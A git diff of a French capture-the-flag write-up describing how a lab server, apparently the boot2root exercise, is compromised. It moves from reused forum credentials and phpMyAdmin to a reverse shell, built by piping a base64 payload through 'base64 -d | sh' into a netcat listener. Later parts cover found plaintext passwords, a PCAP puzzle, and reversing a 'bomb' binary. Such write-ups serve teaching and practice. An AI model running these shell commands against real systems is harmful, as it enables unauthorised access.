@@ -15,7 +15,7 @@ Mot de passe: `!q\]Ej?*5K5cy*AJ`
 En essayant ce mdp un peu partout (ssh puis forum) avec tous les users connus,
 on trouve que ce mdp appartient à lmezard sur le forum.
 
-## Suite
+## Gagner l'acces
 
 Depuis la page utilisateur de lmezard, on trouve son mail
 `laurie@borntosec.net`
@@ -29,6 +29,8 @@ on lit le mail `DB Access`, il contient le couple d'identifiants
 on tente alors de se connecter a PHPMyadmin, succes
 On explore alors un peu, on tente d'identifer les hash des mots de passe, sans succes
 on passe lmezard en admin du forum, ça ne nous aide pas plus...
+
+## Reverse shell
 
 Apres beaucoup de temps a chercher et tenter des trucs, on a une idée:
 
@@ -67,31 +69,98 @@ On tente alors un script python de reverse shell connu (trouvable dans `scripts/
 mais par precaution pour eviter tout soucis avec des caracteres non gérés
 on le passe en base64 puis on url encode la commande suivante
 
-```bash
+```
 printf "<reverse shell en base64>" | base64 -d | sh
 ```
 Ça décode code en base64 et puis ça le lance dans shell
 
 De notre coté on lance netcat en mode écoute avec la commande suivante:
-```bash
+```
 nc -nlvp <PORT>
 ```
 
 On lance le script grace a notre fichier PHP et hop, ça fonctionne !
 
 On stabilise le shell a l'aide du protocole suivant:
-```bash
+```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 puis CTRL-Z
-```bash
+```
 stty raw -echo; fg
 ```
+et enfin
 ```
 export TERM=xterm
 ```
 
 On a maintenant un reverse shell propre sur le serveur.
+
+## Sur le serveur
+
+Une fois sur le serveur on explore un peu.
+Notre première trouvaille intéressante est dans `/home`
+on y trouve le dossier `LOOKATME` qui est le seul dossier accessible.
+Dedans on voit un fichier `password` nous donnant les credentials suivant:
+`lmezard:G!@M6f4Eatau{sF" `
+
+On essaie ses credentials en ssh puis en ftp,
+succès sur le ftp. On explore ce qui est a disposition, deux fichiers
+`fun` et `README`
+
+On les télécharge sur notre machine et on comprend par le readme que c'est un puzzle
+> Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+
+en faisant la commande `file` sur le fichier `fun`, on y comprend que c'est une archive tar.
+on l'extrait et on regarde son contenu.
+
+Plein de fichiers PCAP contenant des portions d'un programme en C.
+Les fichiers sont dans le désordre mais son numérotés.
+A l'aide de du script `merge.py` on remet les fichiers dans l'ordre et on les concatene
+dans un seul fichier.
+
+On retire les données poubelles avec `sanitize.sh`, et encore un peu de traitement a la main.
+On compile le programme et hop
+
+```
+MY PASSWORD IS: Iheartpwnage
+Now SHA-256 it and submit
+```
+
+on s'execute et ça fonctionne, on est connectés en ssh en tant que laurie
+(mdp: `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`)
+
+Depuis le compte de laurie, on trouve deux fichiers, bomb et readme, encore une enignme.
+
+## Da bomb
+La bombe a 6 niveaux, chaque niveau a son code. Le mot de passe de thor correspond
+aux 6 codes cote a cote.
+
+Notre premier reflexe est de décompile le code avec radare2 et gihdra, selon nos préférences.
+
+Certains niveaux sont plutot simples, ne constituent que d'une string écrite en clair
+d'autres sont des algorithmes plus complexes.
+
+Nous avons porté les codes dans le script `defuser.py`. Celui contient ou les solutions en dur
+ou l'algorithme inversé qui permet d'obtenir le code.
+
+Le seul vraiment complexe est le niveau 6, nous avons deviné qu'il fallait
+une combinaison de 6 chiffres uniques allant de 1 a 6 inclus.
+
+Nous avons alors mis en place un script qui désamorce la bombe, en tentant
+les combinaisons possibles. Petit hic, bien que la bombe soit désarmocée
+le mot de passe ne fonctionne pas...
+(voir `defuser.bash` et `defuser.py`)
+
+### Secret phase
+En regardant le code décompilé, nous avons constaté qu'il existe une phase secrete
+accessible en rajoutant "austinpowers" a la 4eme phase
+
+TODO: Comprendre comment arriver la
+TODO: Dechiffrer phase secrete
+
+Le code obtenu est finalement:
+`Publicspeakingisveryeasy.126241207201b2149opekmq426135`
 
 ## Sources
 
